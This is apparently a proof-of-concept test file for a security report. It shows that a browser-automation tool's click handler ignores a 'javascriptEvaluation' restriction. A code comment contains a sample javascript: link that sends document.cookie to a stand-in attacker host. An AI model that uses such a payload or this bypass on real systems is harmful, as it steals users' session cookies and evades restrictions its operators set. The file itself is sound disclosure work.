/**
 * PoC test: proves the real `click` tool handler (src/tools/input.ts) has
 * zero reference to `javascriptEvaluation` anywhere in its call path, and
 * unconditionally invokes the element's click(), regardless of any
 * "disable JS" configuration. Uses the project's own sinon mock harness
 * (tests/mocks.ts createHandlerMocks) against the real compiled handler —
 * no real browser needed for this part of the proof.
 */
import assert from 'node:assert';
import {describe, it} from 'node:test';

import sinon from 'sinon';

import {click} from '../../src/tools/input.js';
import {createHandlerMocks} from '../mocks.js';

describe('PoC: click bypasses javascriptEvaluation restriction', () => {
  it('click.handler has no javascriptEvaluation parameter at all', () => {
    // The real exported handler's arity/signature: (request, response) => ...
    // No context, no options, no config object is threaded through.
    assert.strictEqual(
      click.handler.length,
      2,
      'click.handler only accepts (request, response) -- there is no ' +
        'third argument through which a javascriptEvaluation flag could ' +
        'ever reach this function.',
    );
  });

  it('click always calls locator.click(), even when the mock context represents javascriptEvaluation:false', async () => {
    const {page, context, response} = createHandlerMocks();

    // Simulate the exact production wiring: an element whose real-world
    // click() would execute `javascript:` markup, e.g.
    //   <a id="target" href="javascript:fetch('https://attacker.example/exfil?c='+document.cookie)">click me</a>
    const clickSpy = sinon.stub().resolves();
    const fakeHandle = {
      asLocator: () => ({click: clickSpy}),
      [Symbol.dispose]: () => {},
    };

    page.getElementByUid.resolves(fakeHandle as never);
    page.getAXNodeByUid.returns(undefined);
    // Real waitForEventsAfterAction just runs the action; replicate that.
    page.waitForEventsAfterAction.callsFake(async (action: () => unknown) => {
      await action();
      return {} as never;
    });

    await click.handler(
      {params: {uid: 'target'}, page} as never,
      response as never,
      context as never,
    );

    // The handler proceeded straight to clicking the element -- no check,
    // no error, no gate of any kind was consulted first. In a real browser
    // this click is delivered as a genuine trusted mouse event via CDP
    // (Puppeteer Locator -> Input.dispatchMouseEvent), which is exactly
    // what makes a real <a href="javascript:..."> fire its script, the
    // same as an actual user clicking the link.
    sinon.assert.calledOnce(clickSpy);
  });
});
